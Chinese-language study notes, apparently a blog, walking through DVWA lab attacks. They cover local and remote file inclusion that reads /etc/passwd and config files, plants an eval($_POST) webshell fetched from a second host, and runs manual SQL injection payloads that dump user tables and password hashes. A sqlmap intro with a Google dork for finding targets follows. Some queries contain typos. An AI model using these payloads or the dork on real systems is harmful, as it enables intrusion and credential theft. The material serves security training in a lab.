<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">//The page we wish to display </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>环境中给出的地址如下：<a href="http://192.168.50.129/dvwa/vulnerabilities/fi/?page=include.php%EF%BC%8C%E5%88%99%E6%88%91%E4%BB%AC%E5%9C%A8/var/www/dvwa/vulnerabilities/fi/%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6">http://192.168.50.129/dvwa/vulnerabilities/fi/?page=include.php，则我们在/var/www/dvwa/vulnerabilities/fi/目录下创建文件</a> 1.php，写入<code>&lt;?php echo &quot;hihi&quot;;?&gt;</code></p>
<img src="fileinclusion-test.png" alt="image-20200805143852598" style="zoom:50%;" /></li>
<li><p>在浏览器中输入<a href="http://192.168.50.129/dvwa/vulnerabilities/fi/index.php?page=1.php">http://192.168.50.129/dvwa/vulnerabilities/fi/index.php?page=1.php</a> 或者是<a href="http://192.168.50.129/dvwa/vulnerabilities/fi/?page=1.php%EF%BC%8C%E5%88%99%E4%BC%9A%E8%BF%90%E8%A1%8C">http://192.168.50.129/dvwa/vulnerabilities/fi/?page=1.php，则会运行</a> 1.php 代码</p>
<p>或者尝试包含账号密码、系统信息、敏感文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;192.168.50.129&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;&#x2F;var&#x2F;www&#x2F;dvwa&#x2F;robots.txt</span><br><span class="line"># robots 网络爬虫排除标准 是爬虫爬取的公共协议和行业规范，表示哪些不能爬取</span><br></pre></td></tr></table></figure>
<p><img src="fileinclusion-test2.png"></p>
</li>
</ul>
<hr>
<p>本地文件包含+webshell</p>
<ul>
<li><p>制作一句话图片木马</p>
<ol>
<li>工具 edjpgcom：<a href="https://blog.csdn.net/santtde/article/details/92849299">https://blog.csdn.net/santtde/article/details/92849299</a> - 说实话未成功</li>
<li>手动制作：<a href="https://www.15qq.cn/hacker_script/12.html">https://www.15qq.cn/hacker_script/12.html</a> - 通过 copy</li>
</ol>
</li>
<li><p>上传图片木马文件 - 通过文件上传漏洞 upload</p>
<ul>
<li>此时可以在浏览器中打开图片(通过访问 /hackable/uploads 目录)，图片正常显示，但是图片中包含的 shell 并不会执行，因为服务器不会执行静态资源</li>
<li>我们需要的是图片在服务器被当成程序执行</li>
</ul>
</li>
<li><p>执行文件包含并生成后门</p>
<ul>
<li><p>图片位置不一致</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 文件上传目录</span><br><span class="line">/var/www/dvwa/hackable/uploads/</span><br><span class="line"># 文件包含目录</span><br><span class="line">/var/www/dvwa/vulnerabilities/fi/</span><br><span class="line"></span><br><span class="line"># 相对路径</span><br><span class="line">192.168.50.129/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.JPG</span><br><span class="line"># 绝对路径</span><br><span class="line">192.168.50.129/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/hackable/uploads/shell.JPG</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>通过文件包含漏洞访问图片后，页面显示如下</p>
<p><img src="fileinclusion-test3.png"></p>
<ul>
<li><p>通过菜刀连接 webshell</p>
<ul>
<li>图片中的木马会执行，在<code>/var/www/dvwa/vulnerabilities/fi/</code>目录下生成一个 php 文件，使用该 php</li>
</ul>
</li>
<li><p>参考资料</p>
<ul>
<li><a href="https://blog.csdn.net/Alexz__/article/details/102166392">https://blog.csdn.net/Alexz__/article/details/102166392</a></li>
<li>踩坑，不会成功的情况<ol>
<li>用 edjpgcom 工具</li>
<li>图片是 jpg</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<p>  远程文件包含 + webshell</p>
<ul>
<li><p>使用 kali 建立远程服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动apache</span></span><br><span class="line">systemctl start apache2</span><br><span class="line"><span class="comment"># 建立文件</span></span><br><span class="line">vim /var/www/html/1.txt</span><br><span class="line">&lt;?fputs(fopen(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="string">&#x27;&lt;?php eval($_POST[pass]);?&gt;&#x27;</span>)?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果建立的是php文件，会出现一句话木马无法写入shell.php的情况</span></span><br><span class="line"><span class="comment"># 使用txt或者jpg进行远程文件包含</span></span><br></pre></td></tr></table></figure></li>
<li><p>文件包含</p>
<p><a href="http://192.168.50.129/dvwa/vulnerabilities/fi/?page=http://192.168.50.128/1.txt">http://192.168.50.129/dvwa/vulnerabilities/fi/?page=http://192.168.50.128/1.txt</a></p>
<p>此时在/var/www/dvwa/vulnerabilities/fi 目录下会出现 shell.php 文件</p>
</li>
<li><p>菜刀通过输入<code>http://192.168.50.129/dvwa/vulnerabilities/fi/shell.php</code>和 pass 密码进行连接</p>
</li>
</ul>
<hr>
<ul>
<li><p>medium security</p>
<ul>
<li><p>对本地没有限制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">// The page we wish to display </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bad input validation</span></span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;https://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);        </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>远程文件包含+webshell</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">httphttp://://</span><br><span class="line">hthttp://tp://</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>high security</p>
<ul>
<li>硬编码写死，只能用 include.php 文件，利用白名单机制进行过滤，即很难再进行漏洞的利用</li>
<li>对包含的文件稍微做些检测</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">//The page we wish to display </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only allow include.php</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>参考资料：<a href="https://www.freebuf.com/articles/web/119150.html">https://www.freebuf.com/articles/web/119150.html</a></p>
</li>
</ul>
<hr>
<h1 id="SQL-注入攻击-排在第一位的安全风险"><a href="#SQL-注入攻击-排在第一位的安全风险" class="headerlink" title="SQL 注入攻击 - 排在第一位的安全风险"></a>SQL 注入攻击 - 排在第一位的安全风险</h1><blockquote>
<p>通过<u>构建特殊的输入作为参数</u>传入<strong>web 应用程序</strong>，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所有的操作</p>
<p>其主要原因是程序没有细致地<u>过滤用户输入的数据</u>，导致非法数据入侵系统</p>
<ol>
<li>对于 web 应用程序而言，用户核心数据存储在数据库中，例如 MySQL、SQL server、Oracle</li>
<li>通过 SQL 注入攻击，可以获取、修改、删除数据库信息，并且通过提权来控制 web 服务器等其他操作</li>
<li>SQL 注入即攻击者通过构造特殊的 SQL 语句，入侵目标系统，导致后台数据库<u>泄露数据</u>的过程</li>
<li>因为 SQL 注入漏洞造成的严重危害性，所以常年稳居 OWASP TOP10 的榜首</li>
</ol>
<p>SQL 注入的危害</p>
<ol>
<li>拖库导致用户数据泄露</li>
<li>危害 web 等应用的安全</li>
<li>失去操作系统的控制权</li>
<li>用户信息被非法买卖</li>
<li>危害企业及国家的安全</li>
</ol>
</blockquote>
<h2 id="SQL-基础回顾"><a href="#SQL-基础回顾" class="headerlink" title="SQL 基础回顾"></a>SQL 基础回顾</h2><p>登录 OWASP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">表1：dvwa.users</span><br><span class="line">表2：wordpress.wp_users</span><br><span class="line">表3：mysql.user</span><br><span class="line"></span><br><span class="line">root@owaspbwa:~# mysql -uroot -p&#39;owaspbwa&#39;</span><br><span class="line">&gt; show databases</span><br><span class="line">&gt; show tables</span><br><span class="line">&gt; DESC &#x2F; DESCRIBE users</span><br><span class="line"># Key 可能指主键、外键或者索引</span><br><span class="line"># 查看建表的具体信息</span><br><span class="line">&gt; show create table users\G</span><br><span class="line"># 查看表的内容</span><br><span class="line">select * from users;</span><br><span class="line">select * from users\G;</span><br><span class="line"></span><br><span class="line"># 一些函数</span><br><span class="line">select database();</span><br><span class="line">select user();</span><br><span class="line">select now();</span><br><span class="line"></span><br><span class="line"># 正确写法</span><br><span class="line">select user from users where user_id &#x3D; 1;</span><br><span class="line">select user from users where user_id &#x3D; &#39;1&#39;;</span><br><span class="line">select user from users where user &#x3D; &#39;root&#39;;</span><br><span class="line"># 错误写法</span><br><span class="line">select user from users where user &#x3D; root;</span><br><span class="line"># 如果root不加引号，则会被识别成一个字段&#x2F;列名字，而数字无论加不加引号。都会被识别成数字</span><br><span class="line"></span><br><span class="line"># 漏洞</span><br><span class="line">select user_id,first_name,last_name from dvwa.users where first_name &#x3D; &#39;zzr&#39;;</span><br><span class="line">select user_id,first_name,last_name from dvwa.users where first_name &#x3D; &#39;zzr&#39; or 1&#x3D;1;</span><br><span class="line"></span><br><span class="line"># 上述语句(布尔查询)只能获得后端代码原有sql语句控制的字段，而我们需要拖库，即获得整个表</span><br><span class="line"># 联合查询UNION</span><br><span class="line"># 注：union查询前后字段数必须相同</span><br><span class="line">select user,password from mysql.user;</span><br><span class="line">select user_login,user_pass from wordpress.wp_users;</span><br><span class="line">select user,password from mysql.user union select user_login,user_pass from wordpress.wp_users;</span><br><span class="line"></span><br><span class="line"># 数字可以充当字段</span><br><span class="line">select user,password,host from mysql.user union select user_login,user_pass,1 from wordpress.wp_users;</span><br><span class="line"></span><br><span class="line"># 前者的字段数量和字段名靠猜</span><br><span class="line"># 后者不够的靠补，字段名靠猜</span><br><span class="line">select * from dvwa.users union select 1;</span><br><span class="line">...</span><br><span class="line">select * from dvwa.users union select 1,2,3,4,5;</span><br><span class="line"># 不知道这个系统中有多少库、库里有哪些表、表中有哪些字段、权限问题</span><br><span class="line"></span><br><span class="line"># 前者的查询结果不要(通过假条件)，只显示后者的查询结果</span><br><span class="line"># 但是字段名还是显示的前者的字段名</span><br><span class="line">select user,password,host from mysql.user where 1&#x3D;2 union select user_login,user_pass,1 from wordpress.wp_users;</span><br><span class="line"></span><br><span class="line"># 查询的权限取决于开发人员给你定义的用户的权限</span><br></pre></td></tr></table></figure>
<p><strong>information_schema</strong> - 数据库字典</p>
<p>在里面看到的不一定是一切，得看权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># show databases; 后有一个非常重要的库是 information_schema</span><br><span class="line">use information_schema;</span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">******第一个重要的表 information_schema.tables******</span><br><span class="line"></span><br><span class="line"># 保存了数据库的所有表所有列的元数据meta data &gt; 信息纲要</span><br><span class="line"># 查询数据库库名、表名 information_schema.tables</span><br><span class="line">select * from information_schema.TABLES\G</span><br><span class="line"># 得到 TABLE_SCHEMA 是库的名字 TABLE_NAME 是表的名字</span><br><span class="line"># TABLES中包含所有数据库的所有表名</span><br><span class="line"></span><br><span class="line">select DISTINCT TABLE_SCHEMA from information_schema.TABLES; # 等价于show databases</span><br><span class="line"></span><br><span class="line">select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES\G</span><br><span class="line"></span><br><span class="line">select TABLE_SCHEMA,GROUP_CONCAT(TABLE_NAME) from information_schema.TABLES GROUP BY TABLE_SCHEMA\G</span><br><span class="line"># CONCAT是字符串拼接 GROUP_CONCAT 分组</span><br><span class="line"></span><br><span class="line">select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA&#x3D;&#39;dvwa&#39;; # 等价于show tables</span><br><span class="line"></span><br><span class="line">******第二个重要的表 information_schema.columns******</span><br><span class="line"></span><br><span class="line"># 查询数据库库名、表名、字段名 (TABLE_SCHEMA TABLE_NAME COLUMN_NAME)</span><br><span class="line"># 获得所有列的信息</span><br><span class="line">select * from information_schema.columns\G</span><br><span class="line"></span><br><span class="line">select column_name from INFORMATION_SCHEMA.columns;</span><br><span class="line"></span><br><span class="line"># 某个库的某个表的列 - desc </span><br><span class="line">select column_name from INFORMATION_SCHEMA.columns where table_schema &#x3D; &#39;dvwa&#39; and table_name &#x3D; &#39;users&#39;;</span><br><span class="line"></span><br><span class="line"># 查看用户权限 - 系统库</span><br><span class="line">select column_name from INFORMATION_SCHEMA.columns where table_name &#x3D; &#39;USER_PRIVILEGES&#39;;</span><br><span class="line">+----------------+</span><br><span class="line">| column_name    |</span><br><span class="line">+----------------+</span><br><span class="line">| GRANTEE        |</span><br><span class="line">| TABLE_CATALOG  |</span><br><span class="line">| PRIVILEGE_TYPE |</span><br><span class="line">| IS_GRANTABLE   |</span><br><span class="line">+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"># 查看schema权限</span><br><span class="line">select column_name from INFORMATION_SCHEMA.columns where table_name &#x3D; &#39;SCHEMA_PRIVILEGES&#39;;</span><br><span class="line">+----------------+</span><br><span class="line">| column_name    |</span><br><span class="line">+----------------+</span><br><span class="line">| GRANTEE        |</span><br><span class="line">| TABLE_CATALOG  |</span><br><span class="line">| TABLE_SCHEMA   |</span><br><span class="line">| PRIVILEGE_TYPE |</span><br><span class="line">| IS_GRANTABLE   |</span><br><span class="line">+----------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<h2 id="SQL-注入流程"><a href="#SQL-注入流程" class="headerlink" title="SQL 注入流程"></a>SQL 注入流程</h2><ul>
<li><p>SQL 注入的分类：数字型&amp;字符型</p>
<blockquote>
<p>最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数字型： SELECT 列 FROM 表 WHERE 数字型列&#x3D;值</span><br><span class="line">字符型： SELECT 列 FROM 表 WHERE 字符型列&#x3D;’值’</span><br><span class="line">搜索型： SELECT * FROM 表 WHERE where 被搜索的列 like ‘%值%’</span><br></pre></td></tr></table></figure>
<ul>
<li><p>数字型注入：当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试步骤</span><br><span class="line">1. 加单引号：假设对应的sql：select * from table where id&#x3D;1’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</span><br><span class="line">2. 加 1 and 1&#x3D;1：假设对应的sql：select * from table where id&#x3D;1 and 1&#x3D;1 语句执行正常，与只输入1的页面没有任何差异；</span><br><span class="line">3. 加 1 加and 1&#x3D;2：对应的sql：select * from table where id&#x3D;1 and 1&#x3D;2 语句正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</span><br><span class="line"></span><br><span class="line">如果满足以上三点，则可以判断该URL存在数字型注入</span><br><span class="line"></span><br><span class="line">如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：</span><br><span class="line">select * from table where id &#x3D; &#39;1 and 1&#x3D;1&#39;</span><br><span class="line">select * from table where id &#x3D; &#39;1 and 1&#x3D;2&#39;</span><br><span class="line">查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果</span><br><span class="line"></span><br><span class="line">如果2，3步骤输入均出现正确结果，则能证明不是数字型注入</span><br></pre></td></tr></table></figure></li>
<li><p>字符型注入：当输入的参数为字符串时，称为字符型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试步骤</span><br><span class="line">1. 加单引号：select * from table where id&#x3D;’1’’：由于加单引号后变成三个单引号，则无法执行，程序会报错；</span><br><span class="line">2. 加 1’ and 1&#x3D;1 此时sql 语句为：select * from table where id&#x3D;’1’ and 1&#x3D;1’ ,也无法进行注入，还需要通过注释符号将后面的单引号闭合；</span><br><span class="line"></span><br><span class="line">&gt; Mysql 有三种常用注释符：</span><br><span class="line">&gt; -- 注意，这种注释符后边有一个空格</span><br><span class="line">&gt; # 通过#进行注释</span><br><span class="line">&gt; &#x2F;* *&#x2F; 注释掉符号内的内容</span><br><span class="line"></span><br><span class="line">3. 加 1’ and 1&#x3D;2 -- zzr 此时sql语句为：select * from table where id&#x3D;’1’ and 1&#x3D;2 --zzr’，没有显示任何东西</span><br><span class="line"></span><br><span class="line">如果满足以上三点，可以判断该url为字符型注入</span><br><span class="line"></span><br><span class="line">select * from table where id &#x3D; &#39;1&#39; and 1&#x3D;1</span><br><span class="line">语法正确，逻辑判断正确，所以返回正确</span><br><span class="line">select * from table where id &#x3D; &#39;1&#39; and 1&#x3D;2</span><br><span class="line">语法正确，但逻辑判断错误，所以没有显示</span><br><span class="line"></span><br><span class="line">select * from table where id &#x3D; &quot;$id&quot;;</span><br><span class="line">select * from table where id &#x3D; &#39;$id&#39;;</span><br></pre></td></tr></table></figure></li>
<li><p>SQL 注入分类可以按照参数类型分为数字型和字符型，还有一些常见的注入分类，例如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（1）POST：注入字段位于POST数据中；</span><br><span class="line">（2）Cookie：注入字段位于Cookie数据中；</span><br><span class="line">（3）延时注入：根据数据库延时特性的注入</span><br><span class="line">（4）搜索注入：注入字段在搜索的位置；</span><br><span class="line">（5）base64注入：注入字符经过base64编码后注入；</span><br><span class="line">（7）错误注入：基于数据库错误信息的响应注入</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>常规思路：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 判断是否有SQL注入漏洞(通过web扫描工具，扫描SQL漏洞注入点)</span><br><span class="line">2. 判断操作系统、数据库和web应用的类型，猜解关键数据库表及其重要字段与内容</span><br><span class="line">3. 获取数据库信息，包括管理员信息及拖库，寻找后台登录</span><br><span class="line">4. 加密信息破解，sqlmap可自动破解</span><br><span class="line">5. 提升权限，获得sql-shell、os-shell、登录应用后台</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="手动注入实战"><a href="#手动注入实战" class="headerlink" title="手动注入实战"></a>手动注入实战</h2><h3 id="基于错误的注入-判断是否有注入漏洞"><a href="#基于错误的注入-判断是否有注入漏洞" class="headerlink" title="基于错误的注入 - 判断是否有注入漏洞"></a>基于错误的注入 - 判断是否有注入漏洞</h3><p>错误注入的思路是通过构造特殊的 sql 语句，根据得到的<u>错误信息</u>，确认 sql 注入点。通过数据库报错信息，也可以探测到数据库的类型和其它有用信息。通过输入单引号，<u>触发数据库异常</u>，通过异常日志诊断数据库类型，例如这里是 MySQL 数据库</p>
<ul>
<li><p>low security</p>
<p>没有做安全过滤，直接将获取的值带入数据库语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$num</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$first</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;first_name&quot;</span>);</span><br><span class="line">        <span class="variable">$last</span> = mysql_result(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>字符型注入</strong></p>
<p>当前 SQL 所使用的库为 dvwa，搜索框正常输入 1 ，能够查询处结果</p>
<p>输入单引号，产生了<u>语法错误</u>(有注入的可能性、有注入点，如果弹出信息表示输入错误，说明单引号不能作为输入，被过滤了)，说明能够<strong>接受</strong>单引号作为输入，即用户的输入没有被正当处理，如果后台的处理能够主动过滤单引号(不会把单引号带入 sql 语句中)，则也不会引起错误了 - 通过单引号构造语句</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;&#39; at line 1</span><br><span class="line"></span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;&#39;</span><br><span class="line">select first_name,last_name from dvwa.users where user_id &#x3D; &#39;1&#39;</span><br><span class="line">select first_name,last_name from dvwa.users where user_id &#x3D; &#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line"># 获取当前数据库</span><br><span class="line">1&#39; union select 1,database() #</span><br><span class="line"></span><br><span class="line"># 获取数据库中的表</span><br><span class="line">1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line"></span><br><span class="line"># 获取表中的字段名</span><br><span class="line">1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br><span class="line"></span><br><span class="line"># 得到数据</span><br><span class="line">1&#39; union select group_concat(user_id,first_name),group_concat(password) from users #</span><br><span class="line"></span><br><span class="line"># 此处password是密文，需要MD５转换</span><br></pre></td></tr></table></figure>

<h3 id="基于布尔的注入"><a href="#基于布尔的注入" class="headerlink" title="基于布尔的注入"></a>基于布尔的注入</h3><p>布尔逻辑注入的思路是闭合 SQL 语句、构造 or 和 and 逻辑语句、注释多余的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;&#39;</span><br><span class="line"># &#39; or 1&#x3D;1 -- zzr</span><br><span class="line">SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39; &#39; or 1&#x3D;1 -- zzr &#39;</span><br><span class="line"># or 前面的单引号闭合前面的语句</span><br><span class="line"># or 1&#x3D;1 为真的条件</span><br><span class="line"># -- 注释后面的语句，必须把最后的单引号注释掉</span><br><span class="line"># --后一定要有空格才可以注释,不加空格会报错</span><br><span class="line"># 在 -- 后一定要加一个空格</span><br></pre></td></tr></table></figure>

<h3 id="基于-UNION-注入"><a href="#基于-UNION-注入" class="headerlink" title="基于 UNION 注入"></a>基于 UNION 注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># UNION语句用于联合前面的SELECT查询语句，合并查询更多的信息</span><br><span class="line"># 一般通过错误和布尔注入确认注入点之后，便开始通过UNION语句来获取有效信息</span><br><span class="line"></span><br><span class="line"># 猜测数据列数</span><br><span class="line">&#39; union select 1 -- &#39;</span><br><span class="line">&#39; union select 1,2 -- &#39;</span><br><span class="line">&#39; union select 1,2,3 -- &#39;</span><br><span class="line">&#39; order by 1 #</span><br><span class="line">&#39; order by 2 #</span><br><span class="line">&#39; order by 3 # </span><br><span class="line"># Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br><span class="line"></span><br><span class="line"># SQL注入语句解析</span><br><span class="line">mysql&gt; select first_name,last_name from dvwa.users where user_id &#x3D; &#39;&#39; union select 1 -- &#39;&#39;</span><br><span class="line"></span><br><span class="line"># 获得当前数据库及用户信息</span><br><span class="line"># version() 获取数据库版本信息</span><br><span class="line"># database() 获取当前数据库名</span><br><span class="line"># user() 获取当前用户名</span><br><span class="line">&#39;union select version(),database() -- &#39;</span><br><span class="line">&#39;union select user(),database() -- &#39;</span><br><span class="line">mysql&gt; select first_name,last_name from dvwa.users where user_id&#x3D;&#39;&#39; union select version(),database() -- &#39;&#39;</span><br><span class="line"></span><br><span class="line"># 查询数据库中所有表</span><br><span class="line"># information_schema数据库是MySQL自带的，提供了访问数据库元数据的方式</span><br><span class="line"># 元数据包括数据库名、表名、列数据类型、访问权限、字符集等基础信息</span><br><span class="line"></span><br><span class="line"># SQL注入语句解析</span><br><span class="line">mysql&gt; select * from information_schema.TABLES\G</span><br><span class="line"></span><br><span class="line"># 查询所有库名</span><br><span class="line">&#39; union select TABLE_SCHEMA,1 from INFORMATION_SCHEMA.TABLES -- &#39;</span><br><span class="line"># 发现只有两个库，说明当前权限下只能看到两个库</span><br><span class="line"></span><br><span class="line"># 查看所有库中的所有表名 同时查询表名和对应的库名</span><br><span class="line">&#39; union select TBALE_SCHEMA，table_name from INFORMATION_SCHEMA.tables -- &#39;</span><br><span class="line"></span><br><span class="line"># 查询数据表</span><br><span class="line">&#39; union select 1, column_name from INFORAMTION_SCHEMA.columnswjere table_name &#x3D; &#39;user&#39; -- &#39;</span><br><span class="line"></span><br><span class="line"># 查询数据列</span><br><span class="line"># 此处未写库名，在sql注入中就是当前的库</span><br><span class="line">&#39; union select NULL, user from users -- &#39;</span><br><span class="line">&#39; union select NULL, password from users -- &#39;</span><br><span class="line">&#39; union select user, password from users -- &#39;</span><br><span class="line"># 把其他字段组合到一起</span><br><span class="line">&#39; union select password, concat(first_name, &#39; &#39;, last_name, &#39; &#39;, user) from users -- &#39;</span><br></pre></td></tr></table></figure>

<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>有些数据库对错误信息做了安全配置，使得无法通过以上的方式探测到注入点，此时可以通过<strong>设置 sleep 语句</strong>来探测注入点</p>
<p>SQL Injection (Blind) 盲注</p>
<ul>
<li><p>输入单引号没反应</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and sleep(5) -- </span><br><span class="line"># 说明我们给定的附加语句可以执行</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="sqlmap-自动化注入"><a href="#sqlmap-自动化注入" class="headerlink" title="sqlmap 自动化注入"></a>sqlmap 自动化注入</h2><p>SQL 注入比较好用的工具，首推开源工具 SQLmap，是一个国内外著名的安全稳定性测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎、针对各种不同类型数据库的安全稳定性测试的功能选项，包括获取数据库中储存的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令</p>
<p>SQLmap 支持 MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase 和 SAP MaxDB 等数据库的各种安全漏洞检测</p>
<p>在 kali 上自带</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap --version</span><br><span class="line">sqlmap --hh | less</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在谷歌上搜 inurl .php?id=1</span></span><br></pre></td></tr></table></figure>
